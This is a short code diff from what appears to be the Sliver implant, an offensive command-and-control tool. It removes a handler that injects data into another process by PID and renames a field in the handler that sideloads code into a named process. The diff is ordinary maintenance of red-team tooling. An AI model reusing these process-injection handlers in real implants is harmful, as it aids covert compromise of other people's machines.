@@ -400,26 +400,13 @@ func taskHandler(data []byte, resp RPCResponse) {
 	resp([]byte{}, err)
 }
 
-func remoteTaskHandler(data []byte, resp RPCResponse) {
-	remoteTask := &sliverpb.RemoteTaskReq{}
-	err := proto.Unmarshal(data, remoteTask)
-	if err != nil {
-		// {{if .Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-	err = taskrunner.RemoteTask(int(remoteTask.Pid), remoteTask.Data, remoteTask.RWXPages)
-	resp([]byte{}, err)
-}
-
 func sideloadHandler(data []byte, resp RPCResponse) {
 	sideloadReq := &sliverpb.SideloadReq{}
 	err := proto.Unmarshal(data, sideloadReq)
 	if err != nil {
 		return
 	}
-	result, err := taskrunner.Sideload(sideloadReq.GetProcName(), sideloadReq.GetData(), sideloadReq.GetArgs())
+	result, err := taskrunner.Sideload(sideloadReq.GetProcessName(), sideloadReq.GetData(), sideloadReq.GetArgs())
 	errStr := ""
 	if err != nil {
 		errStr = err.Error()
